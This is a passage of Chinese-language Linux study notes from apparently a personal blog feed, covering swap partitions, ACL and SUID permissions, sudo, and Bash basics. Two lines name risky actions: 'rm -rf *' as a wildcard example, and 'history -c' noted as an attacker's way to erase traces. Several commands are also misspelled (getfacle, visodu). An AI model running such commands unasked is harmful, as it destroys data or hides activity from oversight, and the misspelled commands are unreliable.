<li>buffer（缓冲）：是指在写入数据时，先把分散的写入操作保存到内存当中，当达到一定程度再集中写入硬盘，减少了磁盘碎片和硬盘的反复寻道，加速了数据的写入过程</li>
</ul>
</li>
<li>步骤<ul>
<li>1，按照分区步骤，新建一个逻辑分区<ul>
<li>默认分区id为83，代表Linux标准分区，swap分区号为82</li>
</ul>
</li>
<li>2，使用t参数更改分区号为82，即swap</li>
<li>3，w保存退出</li>
<li>4，partprobe，重新读取分区表<ul>
<li>避免重启</li>
<li>非万能，有时运行之后还是报错，仍需重启</li>
</ul>
</li>
<li>5，格式化<ul>
<li>同普通分区格式化所用命令不同</li>
<li>mkswap /dev/sdb6</li>
</ul>
</li>
<li>6，加入swap分区<ul>
<li>swapon /dev/sdb6</li>
<li>取消分区：swapoff /dev/sdb6</li>
</ul>
</li>
<li>7，swap分区自动挂载<ul>
<li>若是命令操作，重启时仍需手工挂载</li>
<li>修改fstab文件实现自动挂载</li>
<li>添加记录：/dev/sdb6 swap swap default 0 0<ul>
<li>第二个字段为swap，注意没有根/</li>
<li>后面两字段为0 0</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-简介和系统安装</title>
    <url>/2017/12/25/etc/%E7%AE%80%E4%BB%8B%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="简介和系统安装"><a href="#简介和系统安装" class="headerlink" title="简介和系统安装"></a>简介和系统安装</h1><h2 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h2><ul>
<li>发展历史<ul>
<li>Unix-Minix-Linux</li>
<li>Unix与C语言与TCP/IP的出现</li>
<li>Minix<ul>
<li>大学教授、出于教学目的、借鉴unix</li>
<li>拒绝补丁等外来代码，保持了其纯洁性</li>
</ul>
</li>
<li>Linux<ul>
<li>Linus的个人unix<a id="more"></a></li>
<li>标志企鹅</li>
</ul>
</li>
</ul>
</li>
<li>发行版本<ul>
<li>redhat系列<ul>
<li>redhat<ul>
<li>RHEL，redhat enterprise linux，企业</li>
<li>fedora，个人</li>
</ul>
</li>
<li>CentOS：上述redhat的两个付费，此免费，作为替代品</li>
<li>SuSE：多出现于欧洲</li>
<li>fedora：个人使用</li>
<li>gentoo linux：复杂，不建议新手</li>
<li>红旗Linux：国产</li>
</ul>
</li>
<li>Debian系列<ul>
<li>Debian</li>
<li>Ubuntu：桌面优势</li>
<li>KNOPPIX：即时使用，随用随装，小巧</li>
</ul>
</li>
<li>小结<ul>
<li>两系列：软件管理方式不同</li>
<li>基于Linux内核Kernel，所有发行版都称Linux</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="系统分区相关"><a href="#系统分区相关" class="headerlink" title="系统分区相关"></a>系统分区相关</h2><ul>
<li>1，磁盘分区<ul>
<li>一块磁盘划分为多个分区</li>
<li>分区类型<ul>
<li>主分区<ul>
<li>至多4个</li>
</ul>
</li>
<li>扩展分区<ul>
<li>至多一个</li>
<li>主分区加扩展分区至多四个</li>
<li>不可写入数据</li>
<li>只能包含逻辑分区</li>
</ul>
</li>
<li>逻辑分区<ul>
<li>包含于扩展分区</li>
<li>可格式化或写入数据</li>
<li>分区号从5开始，前四为主或扩展</li>
</ul>
</li>
</ul>
</li>
<li>形象化：一个大柜子分成多个小柜子</li>
</ul>
</li>
<li>2，格式化<ul>
<li>高级格式化（又称逻辑格式化），操作系统层面；不同于低级格式化，也就是硬盘层面的。</li>
<li>目的：分区写入文件系统<ul>
<li>按照一定规则，分区划为多个数据块block</li>
<li>建立分区表，即inode列表<ul>
<li>一条记录：文件与数据块的对应</li>
<li>一个文件放入多个数据块</li>
<li>每个文件都有编号，即唯一的ID号，称为inode号</li>
</ul>
</li>
</ul>
</li>
<li>常见文件系统<ul>
<li>Windows：FAT16，FAT32，NTFS</li>
<li>Linux：EXT2，EXT3，EXT4</li>
</ul>
</li>
<li>形象化：一个小柜子划为多个格子，以装不同类型衣服</li>
</ul>
</li>
<li>3，硬件设备文件名<ul>
<li>Linux中所有硬件设备均为文件</li>
<li>Windows：分区-格式化-分配盘符；Linux：分区-格式化-命名设备文件名-分配盘符（即挂载<ul>
<li>个人猜测：</li>
<li>Windows图形化，直接看出分区，不需要为其命名</li>
<li>Linux：命令行下，需要为其命名以辨别</li>
</ul>
</li>
<li>均放置在/dev目录下<ul>
<li>IDE硬盘：hd[a-d]</li>
<li>SCSI/SATA/USB硬盘：sd[a-p]</li>
<li>光驱：cdrom或sr0</li>
<li>软盘：fd[0-1]</li>
<li>鼠标：mouse</li>
</ul>
</li>
<li>分区设备文件名<ul>
<li>硬件设备文件名+数字，如sda1</li>
<li>相应接口的第一块硬盘的第一个分区</li>
</ul>
</li>
<li>硬盘接口<ul>
<li>IDE硬盘接口：最古老</li>
<li>SCSI：昂贵，多用于服务器，比IDE快</li>
<li>SATA：串口；目前使用最广泛；服务器和个人机均可；虚拟机模拟接口也采用；</li>
<li>最主要区别是传输速度</li>
<li>IDE和SCSI已淘汰，SATA流行</li>
</ul>
</li>
<li>此命名过程是系统自动完成，用户仅需要能辨别是哪个硬盘哪个分区即可</li>
</ul>
</li>
<li>4，挂载<ul>
<li>简介<ul>
<li>Windows中称为分配盘符；Linux称为挂载；盘符称为挂载点</li>
<li>挂载后此分区才可正常使用</li>
</ul>
</li>
<li>必须分区<ul>
<li>根分区：/</li>
<li>swap分区：交换分区、内存两倍、至多2G</li>
</ul>
</li>
<li>推荐分区<ul>
<li>启动分区：/boot、200MB</li>
</ul>
</li>
<li>注意与win差异<ul>
<li>可以每一个目录对应一个分区</li>
<li>根目录对应A分区，根目录下的二级目录可对应B分区</li>
</ul>
</li>
</ul>
</li>
<li>总结<ul>
<li>分区：大硬盘分成小的逻辑分区</li>
<li>格式化：写入文件系统</li>
<li>分区设备文件名：为每个分区定义设备文件名</li>
<li>挂载：为分区分配挂载点</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-权限管理</title>
    <url>/2017/12/25/etc/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h1><h2 id="ACL权限"><a href="#ACL权限" class="headerlink" title="ACL权限"></a>ACL权限</h2><ul>
<li>简介与开启<ul>
<li>ACL是为解决身份不足的问题，一般只有ugo三种身份</li>
<li>普通权限即ugo的rwx</li>
<li>查看分区ACL是否权限是否开启<ul>
<li>dumpe2fs -h /dev/sda3<a id="more"></a></li>
<li>dumpe2fs命令是查询指定分区详细文件系统信息的命令</li>
<li>-h：仅显示超级块中信息，而不显示磁盘块的详细信息</li>
<li>一般默认下都是开启的，查看一下以防万一</li>
</ul>
</li>
<li>临时开启分区ACL权限<ul>
<li>默认是开启的，若真未开启，则…</li>
<li>mount -o remount，acl /</li>
<li>重新挂载根分区，并挂载加入acl权限</li>
<li>命令挂载仅是临时生效，重新启动系统后则失效</li>
</ul>
</li>
<li>永久开启分区ACL权限<ul>
<li>vim /etc/fstab<ul>
<li>编辑文件，加入acl</li>
<li>defaults后加,acl</li>
</ul>
</li>
<li>mount -o remount /<ul>
<li>重新挂载文件系统或重启系统，使修改生效</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看与设定<ul>
<li>查看ACL命令<ul>
<li>getfacle +文件名</li>
<li>查看某文件acl权限</li>
</ul>
</li>
<li>设定ACL权限的命令<ul>
<li>setfacle+选项+文件名</li>
<li>选项<ul>
<li>-m：设定acl权限</li>
<li>-x：删除指定的acl权限</li>
<li>-b：删除所有的acl权限</li>
<li>-d：设定默认acl权限</li>
<li>-k：删除默认acl权限</li>
<li>-R：递归设定acl权限</li>
</ul>
</li>
</ul>
</li>
<li>给某用户设定acl权限<ul>
<li>此用户即不可设置为目录的所有者，也不可设置为目录的所属组，故应用到acl</li>
<li>setfacl -m u:st:rx /project/</li>
<li>给用户st赋予r-x权限，使用“u：用户名：权限”格式</li>
</ul>
</li>
<li>给某用户组设定ACL权限<ul>
<li>setfacl -m g:tgroup:rwx /project</li>
<li>为组tgroup分配acl权限，使用“g：组名：权限”格式</li>
</ul>
</li>
<li>设置之后，ll命令查看，在普通权限后有一个加号（ugo的rwx即为普通权限</li>
</ul>
</li>
<li>最大有效权限与删除ACL权限<ul>
<li>最大有效权限mask<ul>
<li>mask是用来指定最大有效权限的</li>
<li>若给用户赋予了acl权限，是需要和mask权限相与，才能得到用户的真正权限</li>
</ul>
</li>
<li>设置最大有效权限<ul>
<li>setfacl -m m:rx /project</li>
<li>设定mask权限为r-x，格式如上</li>
</ul>
</li>
<li>删除ACL权限<ul>
<li>删除指定用户的acl权限<ul>
<li>setfacl -x u：用户名 文件名</li>
</ul>
</li>
<li>删除指定用户组的acl权限<ul>
<li>setfacl -x g：组名 文件名</li>
</ul>
</li>
<li>删除文件的所有acl权限<ul>
<li>setfacl -b 文件名</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>默认ACL权限与递归ACL权限<ul>
<li>递归acl权限<ul>
<li>递归是父目录在设定acl时，所有的子文件和子目录也会拥有的acl权限</li>
<li>setfacl -m u：用户名：权限 -R 文件名</li>
</ul>
</li>
<li>默认acl权限<ul>
<li>默认acl权限的作用是如果给父目录设定了默认acl权限，那么父目录中所有新建的子文件都会继承父目录的acl权限</li>
<li>setfacl -m d：u：用户名：权限 文件名</li>
</ul>
</li>
<li>这两种权限都只针对于目录</li>
</ul>
</li>
</ul>
<h2 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h2><ul>
<li>SetUID和SetGID（以SUID为例<ul>
<li>功能<ul>
<li>只有可以执行的二进制程序才能设定SUID权限</li>
<li>命令执行者要对该程序拥有x，即执行权限</li>
<li>命令执行者在执行该程序时获得该程序文件属主的身份（在执行程序的过程中灵魂附体为文件的属主</li>
<li>SetUID权限只在该程序执行过程中有效，也就是说身份改变只在程序执行过程中有效</li>
</ul>
</li>
<li>举例<ul>
<li>passwd命令拥有SetUID权限，所以普通用户可以修改自己的密码</li>
<li>cat命令没有SetUID权限，所以普通用户不能查看/etc/shadow文件内容</li>
</ul>
</li>
<li>设定suid的方法<ul>
<li>chmod 4755 文件名（4代表suid，2表示sgid，1表示Sbit，7的话表示都有</li>
<li>chmod u+s 文件名</li>
</ul>
</li>
<li>取消SUID的方法<ul>
<li>chmod 755 文件名</li>
<li>chmod u-s 文件名</li>
</ul>
</li>
<li>危险的SetUID<ul>
<li>关键目录应严格控制写权限，如/，/usr</li>
<li>用户的密码设置要严格遵守密码三原则</li>
<li>对系统中默认应该具有SetUID权限的文件作一列表，定时检查有没有这之外的文件被设置了SetUID权限</li>
</ul>
</li>
</ul>
</li>
<li>Sticky BIT<ul>
<li>SBIT粘着位作用<ul>
<li>粘着位目前只对目录有效（SUID针对可执行程序，SGID针对目录和文件</li>
<li>普通目录对该目录拥有w和x权限，即普通用户可以在此目录拥有写入权限</li>
<li>如果没有粘着位，因为普通用户拥有w权限，所以可以删除此目录下所有文件，包括其它用户建立的文件。一旦赋予了粘着位，除了root可以删除所有文件，普通用户就算拥有w权限，也只能删除自己建立的文件，但是不能删除其它用户建立的文件</li>
</ul>
</li>
<li>设置与取消SBIT<ul>
<li>设置<ul>
<li>chmod 1755 目录名</li>
<li>chmod o+t 目录名</li>
</ul>
</li>
<li>取消<ul>
<li>chmod  777 目录名</li>
<li>chmod o-t 目录名</li>
</ul>
</li>
<li>与SUID和SGID得设置方法基本一致</li>
<li>赋予7755，前面的7意义不大，但是也允许</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="文件系统属性chattr权限"><a href="#文件系统属性chattr权限" class="headerlink" title="文件系统属性chattr权限"></a>文件系统属性chattr权限</h2><ul>
<li>chattr命令<ul>
<li>设置文件系统属性</li>
<li>chattr +/-/= 选项 文件/目录名</li>
<li>+/-/=表增加/删除/增加某权限</li>
<li>选项<ul>
<li>i<ul>
<li>如果对文件设置i属性，那么不允许对文件进行删除、改名，也不能添加和修改数据；相当于锁起来了</li>
<li>如果对目录设置i属性，那么只能修改目录下文件的数据，但不允许建立和删除文件</li>
</ul>
</li>
<li>a<ul>
<li>如果对文件设置a属性，那么只能在文件中增加数据，不能删除也不能修改数据，</li>
<li>如果对目录设置a属性，那么只允许在目录中建立和修改文件，但是不允许删除</li>
</ul>
</li>
<li>i属性更严格，a较宽松</li>
</ul>
</li>
</ul>
</li>
<li>lsattr命令<ul>
<li>查看文件系统属性</li>
<li>lsattr + 选项 + 文件名</li>
<li>-a：显示所有文件和目录</li>
<li>-d：若目标是目录，仅列出目录本身的属性，而不是子文件的</li>
</ul>
</li>
</ul>
<h2 id="系统命令sudo权限"><a href="#系统命令sudo权限" class="headerlink" title="系统命令sudo权限"></a>系统命令sudo权限</h2><ul>
<li>sudo权限<ul>
<li>root把本来只能超级用户执行的命令赋予普通用户执行</li>
<li>sudo的操作对象是系统命令，而chattr等的对象是文件及目录</li>
</ul>
</li>
<li>sudo使用<ul>
<li>visodu命令<ul>
<li>直接运行此命令（root运行</li>
<li>实际修改的是/etc/sudoers文件（也可以vim直接修改此文件</li>
<li>其内容编辑<ul>
<li>root ALL=(ALL) ALL<ul>
<li>用户名 被管理主机的地址=（可使用的身份） 授权命令（绝对路径表示</li>
<li>一般地址写ALL或者本机IP，不是指来源IP，也可以网段（自己查</li>
<li>一般可使用的身份：写ALL或不写均可，一般表示此用户使用 root身份</li>
</ul>
</li>
<li><h1 id="wheel-ALL-ALL-ALL"><a href="#wheel-ALL-ALL-ALL" class="headerlink" title="%wheel ALL=(ALL)  ALL"></a>%wheel ALL=(ALL)  ALL</h1><ul>
<li>%组名 被管理主机的地址=（可使用的身份） 授权命令（绝对路径表示</li>
</ul>
</li>
</ul>
</li>
<li>举例<ul>
<li>授权sc用户可以重启服务器<ul>
<li>visudo</li>
<li>添加内容：sc ALL=/sbin/shutdown -r now</li>
</ul>
</li>
<li>普通用户执行sudo赋予的命令<ul>
<li>su -sc</li>
<li>sudo -l（查看可用的sudo命令</li>
<li>sudo /sbin/shutdown -r now（普通用户执行sudo赋予的命令</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Shell及编程基础</title>
    <url>/2017/12/25/etc/Shell%E5%8F%8A%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="Shell及编程基础"><a href="#Shell及编程基础" class="headerlink" title="Shell及编程基础"></a>Shell及编程基础</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>什么是Shell<ul>
<li>1，是一个命令解释器，连接用户与系统内核</li>
<li>由内而外：硬件-系统内核-Shell-应用程序-用户</li>
<li>2，是一个功能强大的、解释执行的编程语言，可直接调用Linux系统命令</li>
</ul>
</li>
<li>分类<a id="more"></a><ul>
<li>Bourne Shell：从1979起Unix就开始使用，其主文件名为sh</li>
<li>C Shell：主要在BSD版的Unix使用，其语法类似C语言而得名</li>
<li>Bash：与sh兼容，如今Linux的基本shell便是Bash</li>
<li>Shell两种主要语法类型：Bourne、C<ul>
<li>两种语法彼此不兼容</li>
<li>Bourne家族：sh、ksh、Bash、psh、zsh（Bash为主流</li>
<li>C家族：csh、tcsh</li>
</ul>
</li>
</ul>
</li>
<li>Linux支持的Shell<ul>
<li>vim  /etc/shells</li>
<li>有：sh、bash、nologin、csh、tcsh</li>
</ul>
</li>
</ul>
<h2 id="shell脚本的执行方式"><a href="#shell脚本的执行方式" class="headerlink" title="shell脚本的执行方式"></a>shell脚本的执行方式</h2><ul>
<li>echo输出命令<ul>
<li>echo + 选项 + 输出内容</li>
<li>-e：支持反斜线控制的字符转换</li>
<li>如echo “ab/bc”：输出ac，/b退格，即向左删除</li>
</ul>
</li>
<li>编写测试脚本<ul>
<li>vim hello.sh</li>
<li>第一行：#! /bin/Bash（表示此脚本为shell脚本，而非注释，不可省略</li>
<li>第二：echo “hello world ”</li>
</ul>
</li>
<li>脚本执行<ul>
<li>赋予执行权限，直接运行（常用<ul>
<li>chmod 755 hello.sh</li>
<li>./hello.sh（或绝对路径</li>
</ul>
</li>
<li>通过Bash调用<ul>
<li>bash hello.sh</li>
<li>甚至不用赋予执行权限</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Bash的基本功能"><a href="#Bash的基本功能" class="headerlink" title="Bash的基本功能"></a>Bash的基本功能</h2><ul>
<li>历史命令<ul>
<li>history + [选项]+[历史命令保存文件]<ul>
<li>直接history：显示历史命令<ul>
<li>默认保存1000条</li>
<li>可在环境变量配置文件/etc/profile中修改（HISTSIZE字段</li>
<li>其配置文件生效需要用户重新登录</li>
</ul>
</li>
<li>-c：清空历史命令<ul>
<li>缓存中和文件中都会清空（ubuntu中测试时，并不会清空文件里的，只会清空缓存）</li>
<li>不建议使用，但攻击者常用来擦除痕迹</li>
</ul>
</li>
<li>-w：把缓存中历史命令写入历史命令保存文件<ul>
<li>手动执行命令来写入，默认用户退出后，会自动写入</li>
<li>默认为～/.bash_history，也可手工指定</li>
</ul>
</li>
</ul>
</li>
<li>历史命令的保存<ul>
<li>默认保存1000条</li>
<li>可在环境变量配置文件/etc/profile中修改（HISTSIZE字段</li>
<li>其配置文件生效需要用户重新登录</li>
<li>默认保存在～/.bash_history</li>
</ul>
</li>
<li>历史命令的调用<ul>
<li>上下箭头显示上一条、下一条命令</li>
<li>!n：再次执行第n条命令</li>
<li>!!：再次执行上一条命令</li>
<li>!字符串：再次执行最后一条、以该字符串开头的命令</li>
</ul>
</li>
</ul>
</li>
<li>命令别名及补全<ul>
<li>常用命令<ul>
<li>alias 别名=‘原命令’：为命令设置别名（如alias vi=‘ vim’</li>
<li>alias：查询已有的命令别名</li>
<li>unalias + 别名：删除别名</li>
</ul>
</li>
<li>命令执行时顺序<ul>
<li>第一顺位：绝对路径或相对路径执行的命令</li>
<li>第二顺位：执行别名</li>
<li>第三顺位：执行Bash内部命令</li>
<li>第四顺位：执行按照$PATH环境变量定义的外部命令</li>
</ul>
</li>
<li>其它<ul>
<li>别名不可与已有系统命令相同，防混淆</li>
<li>让别名永久生效：vi /root/.bashrc后再添加目录（不同用户，家目录不同</li>
</ul>
</li>
<li>命令或文件的补全<ul>
<li>Tab键自动补全</li>
</ul>
</li>
</ul>
</li>
<li>Bash常用快捷键<ul>
<li>ctrl + 字母</li>
<li>a/e：光标移动到命令行开头/结尾</li>
<li>l：清屏，同clear命令</li>
<li>c：强制终止当前命令</li>
<li>u/k：删除或剪切光标之前/之后的内容（避免退格键一个一个删；粘贴则是剪切，不粘则是删除</li>
<li>y：粘贴u或k剪切的内容</li>
<li>r：在历史命令中搜索</li>
<li>d：退出当前终端，即退出登录，同logout</li>
<li>z：暂停，并放入后台</li>
<li>s/q：暂停/恢复屏幕输出</li>
</ul>
</li>
<li>输入或输出重定向<ul>
<li>标准输入输出<ul>
<li>键盘<ul>
<li>设备文件名：/dev/stdin</li>
<li>文件描述符：0</li>
<li>类型：标准输入</li>
</ul>
</li>
<li>显示器<ul>
<li>设备文件名：/dev/stdout<ul>
<li>文件描述符：1</li>
<li>类型：标准输出</li>
</ul>
</li>
<li>设备文件名：/dev/stderr<ul>
<li>文件描述符：2</li>
<li>类型：标准错误输出</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>输出重定向<ul>
<li>其它<ul>
<li>命令执行结果原本输出到屏幕，改变其方向，输出到文件或设备中</li>
<li>有输出的命令才可以用于重定向</li>
<li>错误输出要在大于号前加2，且不可有空格</li>
<li>正确输出和错误输出来分别保存用处不大，需同时保存</li>
</ul>
</li>
<li>正确输出和错误输出不同时保存<ul>
<li>标准输出重定向<ul>
<li>以xx的方式，把命令的正确输出输出到指定文件或设备中</li>
<li>命令 &gt; 文件：以覆盖的方式</li>
<li>命令 &gt;&gt; 文件：以追加的方式</li>
</ul>
</li>
<li>标准错误输出重定向<ul>
<li>以xx的方式，把命令的错误输出输出到指定文件或设备中</li>
<li>错误命令 2&gt; 文件：以覆盖的方式</li>
<li>错误命令 2&gt;&gt; 文件：以追加的方式</li>
</ul>
</li>
<li>正确输出和错误输出来分别保存用处不大，需同时保存，即不管正确与否，都保存</li>
</ul>
</li>
<li>正确输出和错误输出同时保存（建议<ul>
<li>正确输出和错误输出写入同一个文件<ul>
<li>不管正确与否都写入同一个文件</li>
<li>方式1<ul>
<li>命令 &gt; 文件 2&gt;&amp;1（覆盖</li>
<li>命令 &gt;&gt; 文件 2&gt;&amp;1（追加</li>
<li>后面固定是：2&gt;&amp;1</li>
</ul>
</li>
<li>方式2<ul>
<li>命令 &amp;&gt; 文件（覆盖</li>
<li>命令 &amp;&gt;&gt; 文件（追加</li>
<li>推荐使用，易记</li>
</ul>
</li>
</ul>
</li>
<li>正确输出追加至文件1，错误输出追加至文件2<ul>
<li>命令 &gt;&gt; 文件1 2 &gt;&gt; 文件2</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>输入重定向<ul>
<li>命令执行的参数原来是键盘输入，更改为从文件输入</li>
<li>用的不如输出重定向多，以wc为例测试</li>
<li>wc+[选项] +[文件名]<ul>
<li>直接wc：输入字符，ctrl+d结束，会显示输入的行数、单词数、字节数</li>
<li>-c：统计字节数</li>
<li>-w：统计单词数</li>
<li>-l：统计行数</li>
</ul>
</li>
<li>命令 &lt; 文件<ul>
<li>把文件作为命令输入，可统计文件内容相关信息</li>
<li>如wc &lt; test.txt</li>
</ul>
</li>
<li>命令 &lt;&lt; 字符串<ul>
<li>wc &lt;&lt; hello，一直输入，直到遇到hello作为结束，取之间内容作为参数（用的更少，了解</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>多命令顺序执行<ul>
<li>分号;<ul>
<li>命令1；命令2</li>
<li>多个命令顺序执行</li>
<li>命令之间无逻辑关系</li>
<li>如：date: dd命令 ;date（查看执行dd命令所花费时间</li>
</ul>
</li>
<li>&amp;&amp;<ul>
<li>概述<ul>
<li>命令1 &amp;&amp; 命令2</li>
<li>逻辑与</li>
</ul>
</li>
<li>执行逻辑<ul>
<li>1正确执行，2才会执行</li>
<li>1执行不正确，2不会执行</li>
</ul>
</li>
<li>应用<ul>
<li>用于有严格顺序要求的多个命令间，前面执行成功才可以执行后者，前面出一点错就全部停止</li>
<li>如安装软件时：./configure &amp;&amp; make &amp;&amp; make install</li>
</ul>
</li>
</ul>
</li>
<li>||<ul>
<li>概述<ul>
<li>命令1 || 命令2</li>
<li>逻辑或</li>
</ul>
</li>
<li>执行逻辑<ul>
<li>1执行不正确，2才会执行</li>
<li>1正确执行，2不会执行</li>
</ul>
</li>
<li>应用<ul>
<li>同逻辑与结合，判断某命令是否执行成功</li>
<li>如：命令 &amp;&amp; echo yes || echo no（很巧妙，多用于脚本内判断是否执行成功，if语句作用</li>
</ul>
</li>
</ul>
</li>
<li>其他<ul>
<li>dd命令<ul>
<li>dd if=输入文件 of=输出文件 bs=字节数 count=个数</li>
<li>if：指定源文件或源设备</li>
<li>of：指定目标…</li>
<li>bs：指定一次输入/输出多少字节，即把多少字节看作一个数据块</li>
<li>count：指定输入/输出多少个数据块</li>
<li>特殊的复制命令：磁盘、数据、分区、硬盘等的复制，不同于cp文件复制</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>管道符（“|”）<ul>
<li>简介<ul>
<li>命令1 | 命令2</li>
<li>1的正确输出作为2的操作对象</li>
<li>前提是1必须成功执行，否则2不可执行</li>
</ul>
</li>
<li>举例<ul>
<li>ls -a /etc/ | more</li>
<li>more原来跟文件，分屏显示其内容，现在操作对象变为前者命令的输出</li>
<li>netstat -an | grep “ESTABLISTED”</li>
<li>查看当前系统的远程连接</li>
</ul>
</li>
<li>其它<ul>
<li>grep命令<ul>
<li>grep + 选项+“搜索内容” + 文件名</li>
<li>显示其所在的行</li>
<li>-i：忽略大小写</li>
<li>-n：输出行号</li>
<li>-v：反向查找，如-v root，会排除root的那一行</li>
<li>—color=搜索出的关键字用颜色显示</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>通配符及其它特殊符号<ul>
<li>Linux常见通配符<ul>
<li>?：匹配一个任意字符</li>
<li>*：匹配0个或多个，即任何内容</li>
<li>[]：匹配中括号中任意一个字符<ul>
<li>[abc]表一定匹配一个，a或b或c</li>
</ul>
</li>
<li>[-]：匹配其中任意一个字符，-表范围<ul>
<li>[a-z]：表匹配一个小写字母</li>
</ul>
</li>
<li>[^]：逻辑非，匹配不是中括号中的字符<ul>
<li>[^0-9]：匹配一个不是数字的字符</li>
</ul>
</li>
</ul>
</li>
<li>通配符应用<ul>
<li>rm -rf *：删除所有文件</li>
<li>ls ?abc：列出所有abc前一个字符的文件</li>
<li>ls [0-9]*：列出数字开头的文件</li>
<li>ls [^0-9]*：列出非数字开头的文件</li>
</ul>
</li>
<li>其它特殊符号<ul>
<li>单引号<ul>
<li>单引号中的特殊符号都失去各自特殊意义</li>
<li>引起含空格的字符串，使其为一个整体（Linux中空格作为命令、选项、参数的分隔</li>
</ul>
</li>
<li>双引号<ul>
<li>双引号中的特殊符号会失去各自特殊意义</li>
<li>仍有特殊意义的<ul>
<li>$：调用变量的值</li>
<li>单个反引号：引用命令</li>
<li>\：转义字符</li>
</ul>
</li>
</ul>
</li>
<li>反引号<ul>
<li>其括起来的内容是系统命令</li>
<li>Bash中会优先执行，然后再赋值等，如n=‘date’，先执行date命令，将其结果赋值给n变量（输入法问题，故用单引号代替</li>
<li>同$()，但其易看错，不建议使用</li>
</ul>
</li>
<li>$()<ul>
<li>同反引号，引用系统命令</li>
<li>优先执行，如echo $(ls)，会输出ls执行结果</li>
<li>推荐使用</li>
</ul>
</li>
<li>#<ul>
<li>shell脚本中作注释符</li>
<li>配置文件中的注释符</li>
</ul>
</li>
<li>$<ul>
<li>用于调用变量的值，如$name</li>
</ul>
</li>
<li>\<ul>
<li>转义，其后的特殊字符失去特殊意义，变为普通字符</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Bash的变量"><a href="#Bash的变量" class="headerlink" title="Bash的变量"></a>Bash的变量</h2><ul>
<li>概述<ul>
<li>变量设置规则<ul>
<li>由字母、数字、下划线组成，不可数字开头</li>
<li>Bash中变量默认类型都是字符串型，若要进行数值运算，则必须指定变量类型为数值型</li>
<li>变量用等号连接值，等号左右两侧不能有空格</li>
<li>变量的值若有空格，用单/双引号括起来</li>
<li>变量的值，允许有转义符\</li>
<li>若要增加变量值，可进行变量值叠加。不过变量需要用双引号包含”$变量名”或者${变量名}包含</li>
<li>若把命令的输出结果作为值赋值给变量，需要用反引号或$()包含名令</li>
<li>环境变量名建议大写，便于与命令区分</li>
</ul>
</li>
<li>变量分类<ul>
<li>用户自定义变量<ul>
<li>最普通、最常见的</li>
<li>变量名及变量名均自定义</li>
</ul>
</li>
<li>环境变量<ul>
<li>此变量保存的是与系统操作环境相关的数据</li>
<li>系统环境变量不可更改</li>
<li>用户可自行新建新的环境变量</li>
</ul>
</li>
<li>位置参数变量<ul>
<li>用来向脚本中传递参数和数据</li>
<li>变量名不能自定义</li>
<li>变量作用是固定的</li>
<li>从根本上说，就是预定义变量，只不过出现太频繁</li>
</ul>
</li>
<li>预定义变量<ul>
<li>Bash中已定义好的</li>
<li>变量名不能自定义</li>
<li>变量作用是固定的</li>
</ul>
</li>
<li>自上往下：限制越来越严格，后两者限制程度相同</li>
</ul>
</li>
</ul>
</li>
<li>用户自定义变量（即本地变量<ul>
<li>变量定义<ul>
<li>如name=“test test”（有空格，加引号</li>
<li>echo $name（调用时加$</li>
</ul>
</li>
<li>变量叠加<ul>
<li>a=123</li>
<li>a=“$a”456（此时为123456</li>
<li>a=${a}789（此时为123456789</li>
</ul>
</li>
<li>变量调用<ul>
<li>echo $name（调用时加$</li>
</ul>
</li>
<li>变量查看<ul>
<li>set命令</li>
<li>显示系统所有变量（不止自定义的</li>
</ul>
</li>
<li>变量删除<ul>
<li>unset命令</li>
<li>unset name（不需加$</li>
</ul>
</li>
</ul>
</li>
<li>环境变量<ul>
<li>何为环境变量<ul>
<li>用户自定义变量只在当前shell有效</li>
<li>环境变量会在当前shell和此变量所有的子shell中有效</li>
<li>若把环境变量写入相关配置文件，则其会在所有的shell中生效</li>
<li>类似于局部变量和全局变量作用</li>
</ul>
</li>
<li>创建子shell<ul>
<li>当前shell为bash，再键入bash，会进入子shell</li>
<li>pstree可以查看</li>
<li>exit退出当前子shell，回到父shell</li>
</ul>
</li>
<li>设置新的自定义环境变量<ul>
<li>export 变量名=变量值<ul>
<li>声名为环境变量</li>
<li>或者，变量名=变量值，再export 变量名</li>
<li>加$调用变量，如echo $name</li>
</ul>
</li>
<li>env<ul>
<li>查询变量</li>
</ul>
</li>
<li>unset 变量名<ul>
<li>删除变量</li>
<li>如unset name（不需$</li>
</ul>
</li>
</ul>
</li>
<li>常见系统环境变量<ul>
<li>PATH<ul>
<li>作用：定义系统查找命令的路径</li>
<li>echo $PATH：输出许多路径，冒号分割</li>
<li>所有的执行都需要到绝对路径，ls等系统命令也不例外</li>
<li>因PATH的存在，ls可不加绝对路径，直接运行</li>
<li>可变量叠加，将自习脚本路径写入path，但仅本次生效，重启失效</li>
</ul>
</li>
<li>PS1<ul>
<li>作用：定义系统提示符的变量</li>
